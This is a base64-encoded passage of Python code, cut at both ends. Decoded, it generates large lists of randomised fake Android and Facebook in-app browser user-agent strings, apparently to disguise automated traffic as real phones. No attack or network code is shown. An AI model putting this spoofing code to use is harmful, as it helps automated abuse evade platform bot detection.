uMS4wJywnOScsJzEwJywnMTEnLCcxMiddKQogICAgYz1yYW5kb20uY2hvaWNlKFsnSW5maW5peCBYNjUzQyddKQogICAgZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbyk4MC4wLjQ3NTguNjAgVmVyc2lvbi80LjAgTGludXgvJwogICAgaD1yYW5kb20ucmFuZHJhbmdlKDgwLDEwMykKICAgIGk9JzAnCiAgICBqPXJhbmRvbS5yYW5kcmFuZ2UoNDIwMCw0OTAwKQogICAgaz1yYW5kb20ucmFuZHJhbmdlKDQwLDE1MCkKICAgIGw9J01vYmlsZSBTYWZhcmkvNTM3LjM2IFhpYW9NaS9NaW50IEJyb3dzZXIvMy45LjMgJwogICAgdWFrdWg9Zid7YX0ge2J9OyB7Y317ZH17ZX17Zn0pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nCiAgICB1Z2VuLmFwcGVuZCh1YWt1aCkKCiAgICBhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5jaG9pY2UoWyc4LjEuMCcsJzknLCcxMCcsJzExJywnMTInLCcxMyddKQogICAgYz0nTm9raWFfWCcKICAgIGQ9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8nCiAgICBlPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgZj0nMCcKICAgIGc9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgaT0nTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzAwLjIuMC41OC4xMjk7XScKICAgIHVha3VoPWYne2F9IHtifTsge2N9IHtkfXtlfS57Zn0ue2d9LntofSB7aX0nCiAgICB1Z2VuLmFwcGVuZCh1YWt1aCkKCiAgICBhYT0nTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkJwogICAgYj1yYW5kb20uY2hvaWNlKFsnNS4wJywnNi4wJywnNy4wJywnOC4xLjAnLCc5JywnMTAnLCcxMScsJzEyJ10pCiAgICBjPXJhbmRvbS5jaG9pY2UoWydBU1VTX1owMVFEJ10pCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKICAgIGY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBzZXBlcnRpIEdlY2tvKSBWZXJzaS80LjAgQ2hyb21lLycKICAgIGg9cmFuZG9tLnJhbmRyYW5nZSg4MCwxMDMpCiAgICBpPScwJwogICAgaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKICAgIGs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCiAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zODEuMC4gMC4yOS4xMDU7XScKICAgIHVha3VoPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKICAgIHVnZW4uYXBwZW5kKHVha3VoKQoKICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5jaG9pY2UoWyc2JywnNycsJzgnLCc5JywnMTAnLCcxMScsJzEyJ10pCiAgICBjPShbJ1M4OFBsdXMnXSkKICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBlPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTk5KQogICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8nCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzk2LjEuMC4yOC4xMDQ7XScKICAgIHVha3VoPShmJ3thYX0ge2J9OyB7Y317ZH17ZX17Zn0pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nKQogICAgdWdlbi5hcHBlbmQodWFrdWgpCgogICAgYWE9J01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCcKICAgIGI9cmFuZG9tLmNob2ljZShbJzUuMCcsJzYuMCcsJzcuMCcsJzguMS4wJywnOScsJzEwJywnMTEnLCcxMiddKQogICAgYz1yYW5kb20uY2hvaWNlKFsnU00tSjYxMEYnXSkKICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBlPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTA2KQogICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8nCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICB1YWt1aD1mJ3thYX0ge2J9OyB7Y317ZH17ZX17Zn0pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nCiAgICB1Z2VuLmFwcGVuZCh1YWt1aCkKCiAgICBhYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkJwogICAgYj1yYW5kb20uY2hvaWNlKFsnNS4wJywnNi4wJywnNy4wJywnOC4xLjAnLCc5JywnMTAnLCcxMScsJzEyJ10pCiAgICBjPXJhbmRvbS5jaG9pY2UoWydTTS1BNTEgUHJvJ10pCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKICAgIGY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBzZXBlcnRpIEdlY2tvKSBWZXJzaS80LjAgQ2hyb21lLycKICAgIGg9cmFuZG9tLnJhbmRyYW5nZSg4MCwxMDMpCiAgICBpPScwJwogICAgaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKICAgIGs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCiAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNzYuMC4wLjEyIC4xMDg7XScKICAgIHVha3VoPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKICAgIHVnZW4uYXBwZW5kKHVha3VoKQoKICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5jaG9pY2UoWyc1LjAnLCc2LjAnLCc3LjAnLCc4LjEuMCcsJzknLCcxMCcsJzExJywnMTInXSkKICAgIGM9cmFuZG9tLmNob2ljZShbJ1NHUDcxMiddKQogICAgZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgc2VwZXJ0aSBHZWNrbykgVmVyc2kvNC4wIENocm9tZS8nCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNTEuMCAuMC4zOC4xMTc7XScKICAgIHVha3VoPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKICAgIHVnZW4uYXBwZW5kKHVha3VoKQoKICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5jaG9pY2UoWyc1LjAnLCc2LjAnLCc3LjAnLCc4LjEuMCcsJzknLCcxMCcsJzExJywnMTInXSkKICAgIGM9cmFuZG9tLmNob2ljZShbJ1M5OFBybyddKQogICAgZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgc2VwZXJ0aSBHZWNrbykgVmVyc2kvNC4wIENocm9tZS8nCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvNDAxLjAuMC4yNC4gNzc7XScKICAgIHVha3VoPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKICAgIHVnZW4uYXBwZW5kKHVha3VoKQoKICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5jaG9pY2UoWyc1LjAnLCc2LjAnLCc3LjAnLCc4LjEuMCcsJzknLCcxMCcsJzExJywnMTInXSkKICAgIGM9cmFuZG9tLmNob2ljZShbJ2VuLWdiOyBDUEgxOTA5J10pCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKICAgIGY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBzZXBlcnRpIEdlY2tvKSBWZXJzaS80LjAgQ2hyb21lLycKICAgIGg9cmFuZG9tLnJhbmRyYW5nZSg4MCwxMDMpCiAgICBpPScwJwogICAgaj1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKICAgIGs9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCiAgICBsPSdNb2JpbGUgU2FmYXJpLzUzNy4zNiBIZXlUYXBCcm93c2VyLzcuNC4yYmV0YScKICAgIHVha3VoPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKICAgIHVnZW4uYXBwZW5kKHVha3VoKQoKICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQnCiAgICBiPXJhbmRvbS5jaG9pY2UoWyc1LjAnLCc2LjAnLCc3LjAnLCc4LjEuMCcsJzknLCcxMCcsJzExJywnMTInXSkKICAgIGM9cmFuZG9tLmNob2ljZShbJ1NBTVNVTkcgU00tQTc1MEcpJ10pCiAgICBkPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDEsIDk5OSkKICAgIGY9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBnPSdBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBzZXBlcnRpIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xMy4yIENocm9tZS8nCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoODAsMTAzKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICB1YWt1aD1mJ3thYX0ge2J9OyB7Y317ZH17ZX17Zn0pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nCiAgICB1Z2VuLmFwcGVuZCh1YWt1aCkKZm9yIHhkIGluIHJhbmdlKDEwMDAwKToKICAgIGE9cmFuZG9tLmNob2ljZShbJzMnLCc0JywnNScsJzYnLCc3JywnOCcsJzknLCcxMCcsJzExJywnMTInLCcxMyddKQogICAgYj1yYW5kb20uY2hvaWNlKFsnMycsJzQnLCc1JywnNicsJzcnLCc4JywnOScsJzEwJywnMTEnLCcxMicsJzEzJ10pCiAgICBjPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgZD1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKICAgIGU9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCiAgICB1YWt1PWYnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHthfTsgU0FNU1VORyBTTS1BMzA1Rk4pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS97Y30uMC57ZH0ue2V9IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgdWdlbi5hcHBlbmQodWFrdSkKCmZvciB0IGluIHJhbmdlKDEwMDAwKToKICAgIGE9cmFuZG9tLmNob2ljZShbJzMnLCc0JywnNScsJzYnLCc3JywnOCcsJzknLCcxMCcsJzExJywnMTInLCcxMyddKQogICAgYj1yYW5kb20ucmFuZHJhbmdlKDExMTExMSwyMTAwMDApCiAgICBjPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgZD1yYW5kb20ucmFuZHJhbmdlKDQyMDAsNDkwMCkKICAgIGU9cmFuZG9tLnJhbmRyYW5nZSg0MCwxNTApCiAgICBEZW52ZW50YV9BZjE9ZidNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQge2F9OyBDUEgyMTA5IEJ1aWxkL1JLUTEue2J9LjAwMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS97Y30uMC57ZH0ue2V9IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgRGVudmVudGFfQWYyPWYnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIHthfTsgU00tSjYxMEcgQnVpbGQvUFBSMS57Yn0uMDExOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lL3tjfS4wLntkfS57ZX0gTW9iaWxlIFNhZmFyaS81MzcuMzYgSGV5VGFwQnJvd3Nlci80MC44LjguOScKICAgIERlbnZlbnRhX0FmMz1mJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7YX07IFNNLUE0MDVGTiBCdWlsZC9SUDFBLntifS4wMTI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUve2N9LjAue2R9LntlfSBNb2JpbGUgU2FmYXJpLzUzNy4zNicKICAgIERlbnZlbnRhX0FmND1mJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCB7YX07IFNNLU0zMTdGIEJ1aWxkL1NQMUEue2J9LjAxNjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS97Y30uMC57ZH0ue2V9IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgdWFrdTIgPSByYW5kb20uY2hvaWNlKFtEZW52ZW50YV9BZjEsRGVudmVudGFfQWYyLERlbnZlbnRhX0FmMyxEZW52ZW50YV9BZjRdKQogICAgdWdlbi5hcHBlbmQodWFrdTIpCmZvciB4ZCBpbiByYW5nZSgxMDAwMCk6CiAgICBhPSdNb3ppbGxhLzUuMCAoSmF2YTsgVTsgZW4tdXM7IHNhbXN1bmctZ3QtczM4NTApIEFwcGxlV2ViS2l0LzUzMC4xMyAoS0hUTUwsIGxpa2UgR2Vja28pIFVDQnJvd3Nlci84LjYuMC4xOTkvNjkvNDQ0L1VDV0VCIE1vYmlsZSBVTlRSVVNURUQvMS4wJwogICAgYj1yYW5kb20ucmFuZHJhbmdlKDEsIDkpCiAgICBjPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOSkKICAgIGQ9J2VuLXVzOycKICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxMDAsIDk5OTkpCiAgICBmPSdBcHBsZVdlYktpdC81MzAuMTMgKEtIVE1MLCBsaWtlIEdlY2tvKSBVQ0Jyb3dzZXIvOC42LjAuMTk5LzY5LzQ0NC9VQ1dFQicKICAgIGc9cmFuZG9tLnJhbmRyYW5nZSgxLCA5KQogICAgaD1yYW5kb20ucmFuZHJhbmdlKDEsIDQpCiAgICBpPXJhbmRvbS5yYW5kcmFuZ2UoMSwgNCkKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSgxLCA0KQogICAgaz0nTW9iaWxlIFVOVFJVU1RFRC8xLjAnCiAgICB1YWt1PShmJ3thfXtifS57Y30ge2R9e2V9e2Z9e2d9LntofS57aX0ue2p9IHtrfScpCiAgICB1Z2VuLmFwcGVuZCh1YWt1KQoKICAgIGFhPSdNb3ppbGxhLzUuMCAoTGludXg7IFU7IEFuZHJvaWQgMTA7IGlkLWlkOyBSZWRtaSA5QSBCdWlsZC9RUDFBLjE5MDcxMS4wMjApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OS4wLjQzODkuMTE2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JwogICAgYj1yYW5kb20uY2hvaWNlKFsnNicsJzcnLCc4JywnOScsJzEwJywnMTEnLCcxMiddKQogICAgYz0naWQtaWQ7JwogICAgZD1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGU9cmFuZG9tLnJhbmRyYW5nZSgxLCA5OTkpCiAgICBmPXJhbmRvbS5jaG9pY2UoWydBJywnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWiddKQogICAgZz0nQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg5LjAuNDM4OS4xMTYnCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nTW9iaWxlIFNhZmFyaS81MzcuMzYnCiAgICB1YWt1Mj1mJ3thYX0ge2J9OyB7Y317ZH17ZX17Zn0pIHtnfXtofS57aX0ue2p9LntrfSB7bH0nCiAgICB1Z2VuLmFwcGVuZCh1YWt1MikKCiAgICBhYT0nTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDUuMS4xOycKICAgIGI9cmFuZG9tLmNob2ljZShbJzYnLCc3JywnOCcsJzknLCcxMCcsJzExJywnMTInXSkKICAgIGM9J0hVQVdFSSBNMi1BMDFXKScKICAgIGQ9cmFuZG9tLmNob2ljZShbJ0EnLCdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJ10pCiAgICBlPXJhbmRvbS5yYW5kcmFuZ2UoMSwgOTk5KQogICAgZj1yYW5kb20uY2hvaWNlKFsnQScsJ0InLCAnQycsICdEJywgJ0UnLCAnRicsICdHJywgJ0gnLCAnSScsICdKJywgJ0snLCAnTCcsICdNJywgJ04nLCAnTycsICdQJywgJ1EnLCAnUicsICdTJywgJ1QnLCAnVScsICdWJywgJ1cnLCAnWCcsICdZJywgJ1onXSkKICAgIGc9J0FwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85NS4wLjQ2MzguNzQnCiAgICBoPXJhbmRvbS5yYW5kcmFuZ2UoNzMsMTAwKQogICAgaT0nMCcKICAgIGo9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBrPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgbD0nU2FmYXJpLzUzNy4zNicKICAgIHVha3UyPWYne2FhfSB7Yn07IHtjfXtkfXtlfXtmfSkge2d9e2h9LntpfS57an0ue2t9IHtsfScKICAgIHVnZW4uYXBwZW5kKHVha3UyKQpmb3IgdCBpbiByYW5nZSgxMDAwMCk6CiAgICBhPXJhbmRvbS5jaG9pY2UoWycxJywnMS4wJywnMS41JywnMicsJzIuMCcsJzIuNScsJzMnLCczLjAnLCczLjUnLCc0JywnNC4wJywnNC41JywnNScsJzUuMCcsJzUuNScsJzYnLCc2LjAnLCc2LjUnLCc3JywnNy4wJywnNy41JywnOCcsJzguMCcsJzguNScsJzknLCc5LjAnLCc5LjUnLCcxMCcsJzEwLjAnLCcxMC41JywnMTEnLCcxMS4wJywnMTEuNScsJzEyJywnMTIuMCcsJzEyLjUnLCcxMyddKQogICAgYj1yYW5kb20uY2hvaWNlKFsnT1BNMScsJ1RQMUEnLCdSUDFBJywnUFBSMScsJ1BLUTEnLCdRUDFBJywnU1AxQScsJ1JLUTEnXSkKICAgIGM9cmFuZG9tLnJhbmRyYW5nZSgxMTExMTEsMjEwMDAwKQogICAgZD1yYW5kb20ucmFuZHJhbmdlKDExLDE5KQogICAgZT1yYW5kb20ucmFuZHJhbmdlKDczLDEwMCkKICAgIGY9cmFuZG9tLnJhbmRyYW5nZSg0MjAwLDQ5MDApCiAgICBnPXJhbmRvbS5yYW5kcmFuZ2UoNDAsMTUwKQogICAgcmFuZG9tMT1yYW5kb20uY2hvaWNlKFsnU00tTTIzNkInLCdTTS1BMDM3RycsJ1NNLUo3MDFNVCcsJ1NNLUExMTVVJywnU00tRzYxME0nLCdTTS1KNTMwRicsJ1NNLUEzMDdGTicsJ1NNLUE0MDVGTicsJ1NNLVMxMTFETCcsJ1NNLUEwMjJGJywnU00tRzkwMFAnXSkKICAgIHJhbmRvbTI9cmFuZG9tLmNob2ljZShbJ0luZmluaXggSG90IDEwJywnSW5maW5peCBYNjg4QicsJ0luZmluaXggWDY4MkInLCdJbmZpbml4IFg2NThFJywnSW5maW5peCBQUjY1MkInLCdJbmZpbml4IFg2NTlCJywnSW5maW5peCBYNjg5JywnSW5maW5peCBYNjg5RCcsJ0luZmluaXggWDY2MicsJ0luZmluaXggWDY4MTZEJ10pCiAgICByYW5kb20zPXJhbmRvbS5jaG9pY2UoWydDUEgxODYxJywnUk1YMzYzMCcsJ1JNWDM2ODYnLCdSTVgxODA1JywnUk1YMTgwMScsJ1JNWDIwMjAnLCdSTVgxODExJywnUk1YMzA2MycsJ1JNWDMwNjMnLCdSTVgzNTAxJ10pCiAgICByYW5kb200PXJhbmRvbS5jaG9pY2UoWydYaWFvbWkgMTAgUHJvJywnMjIwMTEyM0cnLCcyMjAzMTI5RycsJzIyMDE